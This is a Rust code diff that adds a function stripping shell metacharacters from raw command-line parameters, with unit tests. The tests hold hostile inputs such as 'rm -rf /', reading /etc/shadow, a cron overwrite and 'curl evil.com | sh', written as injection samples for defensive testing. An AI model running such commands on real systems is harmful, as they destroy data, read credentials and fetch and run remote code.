@@ -27,6 +27,46 @@ fn shell_escape(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\\''"))
 }
 
+/// Sanitize a raw_string value: allow word-splitting but strip shell metacharacters.
+///
+/// `raw_string` is intended for multi-arg CLI input (e.g. `gmail +triage --max 5`),
+/// not for arbitrary shell expansion. This strips characters that enable injection
+/// (`;`, `|`, `$()`, backticks, etc.) while preserving normal flag/argument characters.
+fn sanitize_raw_string(value: &str) -> String {
+    let sanitized: String = value
+        .chars()
+        .filter(|c| {
+            !matches!(
+                c,
+                ';' | '|'
+                    | '&'
+                    | '$'
+                    | '`'
+                    | '('
+                    | ')'
+                    | '{'
+                    | '}'
+                    | '<'
+                    | '>'
+                    | '!'
+                    | '\\'
+                    | '"'
+                    | '\''
+                    | '#'
+                    | '~'
+            )
+        })
+        .collect();
+    if sanitized.len() != value.len() {
+        tracing::warn!(
+            original_len = value.len(),
+            sanitized_len = sanitized.len(),
+            "Stripped shell metacharacters from raw_string parameter"
+        );
+    }
+    sanitized
+}
+
 /// Interpolate `{{key}}` placeholders in a command template.
 ///
 /// Parameters with type `"raw_string"` are inserted without shell escaping,
@@ -48,7 +88,7 @@ fn interpolate(
             .map(|t| t == "raw_string")
             .unwrap_or(false);
         let replacement = if is_raw {
-            value.clone()
+            sanitize_raw_string(value)
         } else {
             shell_escape(value)
         };
@@ -293,6 +333,52 @@ mod tests {
         let result = interpolate("gws {{args}}", &args, Some(&param_types));
         // raw_string should NOT be shell-escaped
         assert_eq!(result, "gws gmail +triage --max 5");
+    }
+
+    #[test]
+    fn test_sanitize_raw_string_preserves_normal_args() {
+        assert_eq!(
+            sanitize_raw_string("gmail +triage --max 5"),
+            "gmail +triage --max 5"
+        );
+        assert_eq!(
+            sanitize_raw_string("-v --output /tmp/out.txt"),
+            "-v --output /tmp/out.txt"
+        );
+        assert_eq!(
+            sanitize_raw_string("key=value,foo=bar"),
+            "key=value,foo=bar"
+        );
+    }
+
+    #[test]
+    fn test_sanitize_raw_string_strips_injection() {
+        // Semicolon chaining
+        assert_eq!(sanitize_raw_string("foo; rm -rf /"), "foo rm -rf /");
+        // Command substitution
+        assert_eq!(sanitize_raw_string("$(cat /etc/shadow)"), "cat /etc/shadow");
+        // Backticks
+        assert_eq!(sanitize_raw_string("`whoami`"), "whoami");
+        // Pipes
+        assert_eq!(sanitize_raw_string("foo | sh"), "foo  sh");
+        // Background execution
+        assert_eq!(sanitize_raw_string("sleep 999 &"), "sleep 999 ");
+        // Redirections
+        assert_eq!(
+            sanitize_raw_string("echo pwned > /etc/cron"),
+            "echo pwned  /etc/cron"
+        );
+    }
+
+    #[test]
+    fn test_interpolate_raw_string_sanitized() {
+        let mut args = HashMap::new();
+        args.insert("args".to_string(), "gmail; curl evil.com | sh".to_string());
+        let mut param_types = HashMap::new();
+        param_types.insert("args".to_string(), "raw_string".to_string());
+        let result = interpolate("gws {{args}}", &args, Some(&param_types));
+        // Metacharacters stripped, only safe chars remain
+        assert_eq!(result, "gws gmail curl evil.com  sh");
     }
 
     #[test]
